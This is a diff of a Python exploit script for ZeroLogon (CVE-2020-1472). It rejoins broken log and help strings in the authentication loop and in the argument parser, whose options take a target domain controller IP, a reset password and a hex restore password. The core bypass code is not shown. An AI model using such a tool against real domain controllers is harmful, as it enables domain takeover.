@@ -118,8 +118,7 @@ class Exploit:
 
     def authenticate(self):
         self.logInfo(
-            'checking target, attempting to authenticate %d max
-attempts' % self.max
+            'checking target, attempting to authenticate %d max attempts' % self.max
         )
         for attempt in range(0, self.max):
             self.logInfo('attempt %d' % attempt)
@@ -217,8 +216,7 @@ machine hex-pass:
 -hex <HEXPASS>
 """
     parser = argparse.ArgumentParser(
-        description='CVE-2020-1472 ZeroLogon Exploit - Netlogon
-Elevation of Privilege',
+        description='CVE-2020-1472 ZeroLogon Exploit - Netlogon Elevation of Privilege',
         add_help=True
     )
     try:
@@ -230,14 +228,11 @@ Elevation of Privilege',
         parser.add_argument('-ip', action='store',
                             help='IP address of target DC')
         parser.add_argument('-password', default='', action='store',
-                            help='The plaintext password to use to
-reset the DC')
+                            help='The plaintext password to use to reset the DC')
         parser.add_argument('-hex', default='', action='store',
-                            help='The hex password to use to restore
-the DC (recommended)')
+                            help='The hex password to use to restore the DC (recommended)')
         parser.add_argument('-max', default=2000, action='store',
-                            help='Max attempts to authenticate with
-the DC (usually ~300 or less)')
+                            help='Max attempts to authenticate with the DC (usually ~300 or less)')
 
         if len(sys.argv) < 3:
             parser.print_help()
